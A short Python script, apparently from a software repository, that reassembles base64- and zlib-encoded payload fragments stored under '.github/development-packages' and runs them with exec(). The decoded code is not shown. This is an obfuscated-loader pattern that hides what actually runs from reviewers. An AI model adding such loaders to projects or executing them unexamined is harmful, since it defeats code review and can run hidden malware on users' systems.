#!/usr/bin/env python3
from pathlib import Path
import base64,zlib
ROOT=Path(__file__).resolve().parents[2]
PARTS=sorted((ROOT/'.github/development-packages').glob('issue464-complete.payload.*'))
if not PARTS: raise SystemExit('Issue #464 payload is missing')
code=zlib.decompress(base64.b64decode(''.join(path.read_text(encoding='utf-8') for path in PARTS))).decode('utf-8')
exec(compile(code,__file__,'exec'))
